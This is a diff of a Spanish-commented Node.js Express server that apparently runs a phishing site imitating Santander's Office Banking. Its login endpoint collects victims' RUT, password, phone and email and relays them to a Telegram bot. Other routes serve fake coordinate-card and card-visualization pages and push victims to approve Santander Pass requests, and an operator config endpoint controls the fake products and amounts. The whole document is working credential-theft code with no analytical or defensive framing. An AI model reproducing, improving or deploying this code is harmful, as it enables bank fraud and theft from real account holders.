@@ -6,21 +6,25 @@ const fs = require("fs");
 
 const app = express();
 
+// Habilitar CORS y parsing de JSON
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Servir archivos estáticos desde /public
-app.use(express.static(path.join(__dirname, "public")));
+// Servir archivos estáticos desde la carpeta "public"
+app.use(express.static("public"));
 
+// Credenciales desde variables de entorno en Render
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
+// Lista de RUT bloqueados
 const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
+// Archivo de configuración persistente
 const CONFIG_FILE = path.join(__dirname, "config.json");
 
-// Configuración inicial
+// Cargar configuración inicial desde archivo o defaults
 let config = {};
 if (fs.existsSync(CONFIG_FILE)) {
   config = JSON.parse(fs.readFileSync(CONFIG_FILE, "utf8"));
@@ -30,7 +34,6 @@ if (fs.existsSync(CONFIG_FILE)) {
     monto1: 0,
     producto2: "Tarjeta de Crédito WorldMember Limited Business",
     monto2: 0,
-    producto3: "Visualización de Tarjeta",   // 👈 sin monto
     tipoAutorizacion: "santander",
     coord1: "",
     coord2: "",
@@ -40,12 +43,7 @@ if (fs.existsSync(CONFIG_FILE)) {
   fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
 }
 
-// Ruta raíz: index.html
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "public", "index.html"));
-});
-
-// Login
+// Endpoint de login (ahora también acepta correo)
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, telefono, mail } = req.body;
 
@@ -57,7 +55,7 @@ app.post("/proxy-login", async (req, res) => {
     return res.status(403).send("❌ Tu clave digital ha sido bloqueada.");
   }
 
-  let mensaje = "📩 Inicio de sesión en AutOB:\n";
+  let mensaje = "📩 Ingreso de sesión en AutOB:\n";
   if (rut) mensaje += `🆔 RUT: ${rut}\n`;
   if (passwd) mensaje += `🔑 Contraseña: ${passwd}\n`;
   if (telefono) mensaje += `📱 Teléfono: ${telefono}\n`;
@@ -77,15 +75,17 @@ app.post("/proxy-login", async (req, res) => {
   }
 });
 
-// Autorización general
+// Endpoint de autorización general
 app.post("/autorizar", async (req, res) => {
   const { mensaje } = req.body;
+
   try {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
     });
+
     res.send("✅ Autorización enviada.");
   } catch (error) {
     console.error(error);
@@ -93,38 +93,25 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Coordenadas dinámicas
+// Endpoint para coordenadas dinámicas
 app.get("/coordenadas", (req, res) => {
   const letras = ["A","B","C","D","E","F"];
   const seleccion = letras.sort(() => 0.5 - Math.random()).slice(0,3);
   res.json({ coordenadas: seleccion });
 });
 
-// Configuración
+// Endpoint de configuración (para admin)
 app.get("/config", (req, res) => {
   res.json(config);
 });
 
 app.post("/config", (req, res) => {
-  config.producto1 = req.body.producto1 || "";
-  config.monto1 = req.body.monto1 || 0;
-
-  config.producto2 = req.body.producto2 || "";
-  config.monto2 = req.body.monto2 || 0;
-
-  config.producto3 = req.body.producto3 || ""; // 👈 sin monto
-
-  config.tipoAutorizacion = req.body.tipoAutorizacion || "santander";
-  config.coord1 = req.body.coord1 || "";
-  config.coord2 = req.body.coord2 || "";
-  config.coord3 = req.body.coord3 || "";
-  config.factibilidad = req.body.factibilidad || config.factibilidad;
-
+  config = { ...config, ...req.body };
   fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2));
   res.json(config);
 });
 
-// Autorización según tipo
+// Ruta de autorización de productos
 app.get("/autorizacion", (req, res) => {
   if (config.tipoAutorizacion === "coordenadas") {
     return res.sendFile(path.join(__dirname, "public", "coordenadas.html"));
@@ -133,7 +120,7 @@ app.get("/autorizacion", (req, res) => {
   }
 });
 
-// Factibilidad
+// Ruta independiente para factibilidad de tarjeta
 app.get("/factibilidad", (req, res) => {
   if (config.factibilidad === "on") {
     return res.sendFile(path.join(__dirname, "public", "creditCardEvaluation.html"));
@@ -142,12 +129,38 @@ app.get("/factibilidad", (req, res) => {
   }
 });
 
-// Visualización de tarjeta
-app.get("/visualizacion-tarjeta", (req, res) => {
-  return res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
+// Flujo de factibilidad
+app.post("/credit/visualizacion", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "creditCardVisualization.html"));
 });
 
-const PORT = process.env.PORT || 10000;
+app.post("/credit/autorizar", async (req, res) => {
+  const mensaje = "AUTORIZA TARJETA DIGITAL!!";
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
+    });
+
+    res.send(`
+      <html>
+        <body>
+          <img src="logo-officebanking.png" style="height:60px;">
+          <h2>VISUALIZACIÓN DE TU TARJETA DIGITAL</h2>
+          <p style="color:red;">Debes autorizar en tu Santander Pass la visualización de la tarjeta.</p>
+        </body>
+      </html>
+    `);
+  } catch (error) {
+    console.error(error);
+    res.status(500).send("❌ Error al enviar la autorización.");
+  }
+});
+
+// Iniciar servidor
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Servidor corriendo en el puerto ${PORT}`);
 });
